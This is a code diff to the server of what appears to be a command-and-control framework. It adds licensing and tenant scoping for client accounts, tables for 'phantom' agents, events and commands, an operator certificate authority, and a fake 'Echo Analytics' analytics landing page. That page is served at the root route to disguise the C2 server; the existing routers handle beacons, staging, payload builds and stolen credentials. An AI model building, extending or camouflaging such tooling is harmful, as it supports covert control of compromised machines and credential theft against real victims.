@@ -9,6 +9,7 @@ import sys
 from contextlib import asynccontextmanager
 
 from fastapi import WebSocket, WebSocketDisconnect
+from fastapi.responses import HTMLResponse
 
 import yaml
 from fastapi import FastAPI
@@ -20,7 +21,7 @@ from models.agent import Base
 from services.agent_manager import manager as agent_manager
 from services.channel_reader import ChannelReader
 from services.dns_server import start_dns_server
-from routers import auth, beacon, agents, tasks, build, stage, creds
+from routers import auth, beacon, agents, tasks, build, stage, creds, phantom_c2
 from routers.auth import verify_token_str
 from services.ws_manager import ws_manager
 
@@ -91,23 +92,72 @@ SessionLocal = sessionmaker(bind=engine, autocommit=False, autoflush=False)
 Base.metadata.create_all(bind=engine)
 
 # Import Base from all models so tables are created
-import models.task  # noqa: F401
-import models.log   # noqa: F401
-import models.user  # noqa: F401
-import models.cred  # noqa: F401
+import models.task           # noqa: F401
+import models.log            # noqa: F401
+import models.user           # noqa: F401
+import models.cred           # noqa: F401
+import models.license        # noqa: F401
+import models.phantom_agent  # noqa: F401
+import models.ca             # noqa: F401
 Base.metadata.create_all(bind=engine)
 
 with engine.connect() as _conn:
-    _cols = [r[1] for r in _conn.execute(__import__('sqlalchemy').text("PRAGMA table_info(agents)")).fetchall()]
+    _txt = __import__('sqlalchemy').text
+
+    _cols = [r[1] for r in _conn.execute(_txt("PRAGMA table_info(agents)")).fetchall()]
     if "parent_id" not in _cols:
-        _conn.execute(__import__('sqlalchemy').text("ALTER TABLE agents ADD COLUMN parent_id TEXT DEFAULT ''"))
+        _conn.execute(_txt("ALTER TABLE agents ADD COLUMN parent_id TEXT DEFAULT ''"))
         _conn.commit()
     if "ip" not in _cols:
-        _conn.execute(__import__('sqlalchemy').text("ALTER TABLE agents ADD COLUMN ip TEXT DEFAULT ''"))
+        _conn.execute(_txt("ALTER TABLE agents ADD COLUMN ip TEXT DEFAULT ''"))
         _conn.commit()
     if "auto_enum_done" not in _cols:
-        _conn.execute(__import__('sqlalchemy').text("ALTER TABLE agents ADD COLUMN auto_enum_done INTEGER DEFAULT 0"))
+        _conn.execute(_txt("ALTER TABLE agents ADD COLUMN auto_enum_done INTEGER DEFAULT 0"))
         _conn.commit()
+
+    # licenses: add missing columns
+    try:
+        _lcols = [r[1] for r in _conn.execute(_txt("PRAGMA table_info(licenses)")).fetchall()]
+        for _col, _def in [
+            ("last_build_uuid", "TEXT"),
+            ("last_build_at",   "TEXT"),
+            ("last_feat_flags", "TEXT"),
+            ("last_built_by",   "TEXT"),
+            ("cert_pfx_b64",    "TEXT"),
+        ]:
+            if _col not in _lcols:
+                _conn.execute(_txt(f"ALTER TABLE licenses ADD COLUMN {_col} {_def}"))
+                _conn.commit()
+    except Exception:
+        pass  # table doesn't exist yet — create_all handles it
+
+    # users: license_key column for client accounts
+    try:
+        _ucols = [r[1] for r in _conn.execute(_txt("PRAGMA table_info(users)")).fetchall()]
+        if "license_key" not in _ucols:
+            _conn.execute(_txt("ALTER TABLE users ADD COLUMN license_key TEXT DEFAULT NULL"))
+            _conn.commit()
+    except Exception:
+        pass
+
+    # phantom_agents: license_key tenant scoping
+    try:
+        _acols = [r[1] for r in _conn.execute(_txt("PRAGMA table_info(phantom_agents)")).fetchall()]
+        if "license_key" not in _acols:
+            _conn.execute(_txt("ALTER TABLE phantom_agents ADD COLUMN license_key TEXT DEFAULT ''"))
+            _conn.commit()
+    except Exception:
+        pass
+
+    # phantom_events + phantom_commands: license_key tenant scoping
+    for _tbl in ("phantom_events", "phantom_commands"):
+        try:
+            _tcols = [r[1] for r in _conn.execute(_txt(f"PRAGMA table_info({_tbl})")).fetchall()]
+            if "license_key" not in _tcols:
+                _conn.execute(_txt(f"ALTER TABLE {_tbl} ADD COLUMN license_key TEXT DEFAULT ''"))
+                _conn.commit()
+        except Exception:
+            pass
 
 
 def _seed_default_admin() -> None:
@@ -130,6 +180,19 @@ def _seed_default_admin() -> None:
 
 
 _seed_default_admin()
+
+
+def _init_ca() -> None:
+    from services.ca import get_or_create
+    db = SessionLocal()
+    try:
+        get_or_create(db)
+        logger.info("Operator CA ready")
+    finally:
+        db.close()
+
+
+_init_ca()
 
 
 def get_db():
@@ -247,7 +310,113 @@ app.include_router(agents.router)
 app.include_router(build.router)
 app.include_router(stage.router)
 app.include_router(creds.router)
+app.include_router(phantom_c2.router)
 
+
+_COVER_HTML = """<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Echo Analytics — Developer Platform</title>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{font-size:16px;-webkit-font-smoothing:antialiased}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;background:#0b0f1a;color:#c8d6ea;line-height:1.6;min-height:100vh;display:flex;flex-direction:column}
+a{color:#60a5fa;text-decoration:none}
+a:hover{color:#93c5fd}
+nav{border-bottom:1px solid #1e2d45;padding:.9rem 2rem;display:flex;align-items:center;justify-content:space-between}
+.logo{display:flex;align-items:center;gap:.5rem}
+.logo-dot{width:8px;height:8px;border-radius:50%;background:#22c55e;box-shadow:0 0 6px #22c55e}
+.logo-name{font-weight:700;font-size:.95rem;color:#e2e8f0;letter-spacing:-.02em}
+.logo-name span{color:#60a5fa}
+.nav-meta{font-size:.75rem;color:#3d5570;display:flex;align-items:center;gap:1rem}
+.status-pill{display:inline-flex;align-items:center;gap:.35rem;padding:.2rem .55rem;background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);border-radius:999px;font-size:.72rem;color:#4ade80}
+.status-pill::before{content:'';width:5px;height:5px;border-radius:50%;background:#22c55e}
+main{flex:1;max-width:960px;margin:0 auto;padding:4rem 2rem 2rem;width:100%}
+.hero{margin-bottom:3.5rem}
+.hero-version{font-size:.72rem;letter-spacing:.15em;text-transform:uppercase;color:#3d5570;margin-bottom:.8rem}
+.hero h1{font-size:clamp(1.8rem,4vw,2.8rem);font-weight:800;letter-spacing:-.04em;color:#f1f5f9;line-height:1.1;margin-bottom:.9rem}
+.hero p{font-size:1rem;color:#6b89aa;max-width:520px;line-height:1.65}
+.feat-row{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:1px;background:#1e2d45;border:1px solid #1e2d45;border-radius:6px;overflow:hidden;margin-bottom:3rem}
+.feat{background:#0d1729;padding:1.4rem 1.6rem}
+.feat-icon{font-size:1.1rem;margin-bottom:.6rem}
+.feat h3{font-size:.9rem;font-weight:700;color:#c8d6ea;margin-bottom:.3rem}
+.feat p{font-size:.82rem;color:#4a6a8a;line-height:1.5}
+.api-section h2{font-size:.72rem;font-weight:700;letter-spacing:.14em;text-transform:uppercase;color:#3d5570;margin-bottom:1rem}
+.api-list{border:1px solid #1e2d45;border-radius:6px;overflow:hidden}
+.api-row{display:flex;align-items:center;gap:1rem;padding:.85rem 1.2rem;background:#0d1729;border-bottom:1px solid #1e2d45;font-family:'Cascadia Code','Courier New',monospace;font-size:.82rem}
+.api-row:last-child{border-bottom:none}
+.method{padding:.15rem .5rem;border-radius:3px;font-size:.7rem;font-weight:700;letter-spacing:.05em;width:38px;text-align:center;flex-shrink:0}
+.get{background:rgba(34,197,94,.1);color:#4ade80}
+.post{background:rgba(96,165,250,.1);color:#93c5fd}
+.api-path{color:#c8d6ea}
+.api-desc{margin-left:auto;color:#3d5570;font-family:inherit;font-size:.78rem}
+footer{border-top:1px solid #1e2d45;padding:1.2rem 2rem;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:.5rem}
+.foot-copy{font-size:.75rem;color:#2a3f58}
+.foot-links{display:flex;gap:1.5rem}
+.foot-links a{font-size:.75rem;color:#2a3f58}
+.foot-links a:hover{color:#4a6a8a}
+</style>
+</head>
+<body>
+<nav>
+  <div class="logo">
+    <div class="logo-dot"></div>
+    <div class="logo-name">Echo<span>Analytics</span></div>
+  </div>
+  <div class="nav-meta">
+    <span>API v2.4</span>
+    <span class="status-pill">Operational</span>
+  </div>
+</nav>
+<main>
+  <div class="hero">
+    <div class="hero-version">Developer Platform</div>
+    <h1>Real-time analytics<br>for modern apps</h1>
+    <p>Collect, process, and visualize telemetry data at scale. Built for engineering teams that need reliable, low-latency metrics infrastructure.</p>
+  </div>
+  <div class="feat-row">
+    <div class="feat">
+      <div class="feat-icon">&#9889;</div>
+      <h3>High-throughput ingestion</h3>
+      <p>Ingest millions of events per second with sub-millisecond write latency across all regions.</p>
+    </div>
+    <div class="feat">
+      <div class="feat-icon">&#128274;</div>
+      <h3>Secure by default</h3>
+      <p>mTLS authentication, per-client API keys, and end-to-end encryption for all data in transit.</p>
+    </div>
+    <div class="feat">
+      <div class="feat-icon">&#128202;</div>
+      <h3>Flexible querying</h3>
+      <p>SQL-compatible query engine with support for time-series aggregations and real-time dashboards.</p>
+    </div>
+  </div>
+  <div class="api-section">
+    <h2>API Reference</h2>
+    <div class="api-list">
+      <div class="api-row"><span class="method post">POST</span><span class="api-path">/api/v1/events</span><span class="api-desc">Ingest event batch</span></div>
+      <div class="api-row"><span class="method get">GET</span><span class="api-path">/api/v1/query</span><span class="api-desc">Execute analytics query</span></div>
+      <div class="api-row"><span class="method get">GET</span><span class="api-path">/api/v1/status</span><span class="api-desc">Platform health</span></div>
+      <div class="api-row"><span class="method post">POST</span><span class="api-path">/api/v1/streams</span><span class="api-desc">Create data stream</span></div>
+    </div>
+  </div>
+</main>
+<footer>
+  <span class="foot-copy">Echo Analytics Inc. &copy; 2025</span>
+  <div class="foot-links">
+    <a href="#">Documentation</a>
+    <a href="#">Status</a>
+    <a href="#">Contact</a>
+  </div>
+</footer>
+</body>
+</html>"""
+
+@app.get("/", response_class=HTMLResponse, include_in_schema=False)
+async def cover():
+    return _COVER_HTML
 
 @app.get("/health")
 async def health():
